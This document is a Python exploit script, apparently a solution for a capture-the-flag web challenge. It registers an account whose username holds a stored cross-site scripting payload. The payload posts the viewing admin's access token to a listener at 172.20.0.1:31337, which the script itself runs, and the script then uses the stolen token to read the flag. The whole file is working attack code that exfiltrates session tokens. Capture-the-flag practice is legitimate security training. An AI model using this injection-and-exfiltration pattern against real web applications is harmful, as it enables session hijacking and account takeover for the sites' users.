#!/usr/bin/env python3

import http.server
import requests


chal_url = requests.get("http://127.0.0.1:4100").url.rstrip("/index.html")
EXFIL_ADDRESS = "172.20.0.1"

print(chal_url)

INJECTION = f"<script>$.post('http://{EXFIL_ADDRESS}:31337', access_token)</script>"

requests.post(
    chal_url + "/register",
    data={
        "username": INJECTION,
        "password": "1234",
        "full_name": "Louis",
        "email": "lourkeur@polygl0ts.ch", # not a real e-mail address
    },
)
access_token = requests.post(
    chal_url + "/token", data={"username": INJECTION, "password": "1234"}
).json()["access_token"]


requests.post(
    chal_url + "/lines/add",
    headers={"Authorization": f"Bearer {access_token}"},
    data={"description": "don't care", "amount": 1234},
)


class MyHTTPHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        nbytes = int(self.headers["content-length"])
        global admin_access_token
        admin_access_token = self.rfile.read(nbytes).decode()
        self.send_response(200)


http.server.HTTPServer((EXFIL_ADDRESS, 31337), MyHTTPHandler).handle_request()

flag = requests.get(
    chal_url + "/flag", headers={"Authorization": f"Bearer {admin_access_token}"}
).json()
print(flag)
